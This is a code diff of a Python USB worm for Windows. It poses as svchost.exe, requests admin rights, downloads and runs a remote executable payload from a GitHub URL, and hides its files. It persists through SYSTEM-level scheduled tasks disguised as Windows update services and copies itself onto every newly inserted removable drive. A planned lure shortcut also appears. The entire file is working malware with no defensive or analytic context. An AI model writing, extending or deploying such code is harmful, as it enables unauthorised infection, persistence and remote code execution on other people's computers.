@@ -1,70 +1,86 @@
 import os
 import shutil
 import subprocess
-import winreg
 import psutil
 import time
+import ctypes
 import requests
+import sys
 
-PAYLOAD_PATH = os.path.join(os.getenv('TEMP'), 'init.exe')
-SYSTEM_PATH = os.path.join(os.getenv('APPDATA'), 'Microsoft\Windows\Templates\worm.py')
-TASK_NAME = "SystemUpdateTask"
-FLAG_FILE = r"C:\Windows\Temp\1572754491.txt"
+WORM_NAME = "svchost.exe"
+PAYLOAD_NAME = "init.exe"
+WORM_PATH = os.path.join(os.getenv('APPDATA'), 'Microsoft\Windows\Templates', WORM_NAME) 
+PAYLOAD_PATH = os.path.join(os.getenv('TEMP'), PAYLOAD_NAME) 
+WORM_TASK_NAME = "WindowsUpdateService"  
+PAYLOAD_TASK_NAME = "SystemUpdateTask"  
+FLAG_FILE = os.path.join(os.getenv('TEMP'), "1572754491.txt")
 
-def is_usb_drive(path):
-    drive = os.path.splitdrive(path)[0]
+def is_admin():
+    return ctypes.windll.shell32.IsUserAnAdmin()
+
+def request_admin():
+    if not is_admin():
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
+        sys.exit(0)
+
+def is_usb_drive():
+    drive = os.path.splitdrive(os.path.abspath(sys.executable))[0]
     for partition in psutil.disk_partitions():
-        if partition.device == drive:
-            return 'removable' in partition.opts
+        if partition.device == drive and 'removable' in partition.opts:
+            return True
     return False
 
-def add_to_run(key_name, path):
-    try:
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
-        winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, path)
-        winreg.CloseKey(key)
-    except PermissionError:
-        pass  # Requires admin privileges
-
-def check_payload():
-    init_link = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/initializers/init.exe"
+def download_payload():
+    init_url = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/initializers/init.exe"
     if not os.path.exists(PAYLOAD_PATH):
         try:
-            response = requests.get(init_link)
-            if response.status_code == 200:
-                with open(PAYLOAD_PATH, "wb") as f:
-                    f.write(response.content)
+            response = requests.get(init_url, stream=True)
+            with open(PAYLOAD_PATH, 'wb') as f:
+                f.write(response.content)
+                subprocess.run(['attrib', '+h', '+s', '+r', PAYLOAD_PATH], shell=True)
         except: pass
 
-def create_scheduled_task():
-    """Create a one-time scheduled task to run the payload with SYSTEM privileges."""
+def create_scheduled_tasks():
+    worm_cmd = f'schtasks /create /tn {WORM_TASK_NAME} /tr "{WORM_PATH}" /sc onlogon /ru SYSTEM /rl HIGHEST /f'
+    subprocess.run(worm_cmd, shell=True, capture_output=True)
     if not os.path.exists(FLAG_FILE):
-        command = f'schtasks /create /tn {TASK_NAME} /tr "{PAYLOAD_PATH}" /sc once /ru SYSTEM /rl HIGHEST /f'
-        subprocess.run(command, shell=True)
-        subprocess.run(f'schtasks /run /tn {TASK_NAME}', shell=True)
+        payload_cmd = f'schtasks /create /tn {PAYLOAD_TASK_NAME} /tr "{PAYLOAD_PATH}" /sc once /ru SYSTEM /rl HIGHEST /f'
+        subprocess.run(payload_cmd, shell=True, capture_output=True)
+        subprocess.run(f'schtasks /run /tn {PAYLOAD_TASK_NAME}', shell=True, capture_output=True)
+        with open(FLAG_FILE, 'w') as f:
+            f.write("done")
 
-def monitor_usb_drives():
-    """Monitor for new USB drives and copy the worm to them."""
+def install_worm():
+    if not os.path.exists(os.path.dirname(WORM_PATH)):
+        os.makedirs(os.path.dirname(WORM_PATH))
+    shutil.copy(sys.executable, WORM_PATH)
+    subprocess.run(['attrib', '+h', '+s', '+r', WORM_PATH], shell=True)
+
+def infect_usb(drive):
+    """Copy worm to USB, create lure."""
+    worm_dest = os.path.join(drive, WORM_NAME)
+    shutil.copy(sys.executable, worm_dest)
+    subprocess.run(['attrib', '+h', '+s', '+r', worm_dest], shell=True)
+    # TODO: Add shortcut lure (e.g., Confidential.lnk) with pywin32
+
+def monitor_usb():
     known_drives = set(p.mountpoint for p in psutil.disk_partitions() if 'removable' in p.opts)
     while True:
-        check_payload()
         current_drives = set(p.mountpoint for p in psutil.disk_partitions() if 'removable' in p.opts)
         new_drives = current_drives - known_drives
         for drive in new_drives:
-            shutil.copy(__file__, os.path.join(drive, 'worm.py'))
+            infect_usb(drive)
         known_drives = current_drives
-        time.sleep(5)
+        time.sleep(2)
 
 def main():
-    if is_usb_drive(__file__):
-        # Running from USB: copy to system, set persistence, create task
-        shutil.copy(__file__, SYSTEM_PATH)
-        shutil.copy(__file__, PAYLOAD_PATH) 
-        add_to_run("WindowsUpdate", SYSTEM_PATH)
-        create_scheduled_task()
+    if is_usb_drive():
+        request_admin()
+        install_worm()
+        download_payload()
+        create_scheduled_tasks()
     else:
-        # Running from system: monitor USB drives for spreading
-        monitor_usb_drives()
+        monitor_usb()
 
 if __name__ == "__main__":
     main()
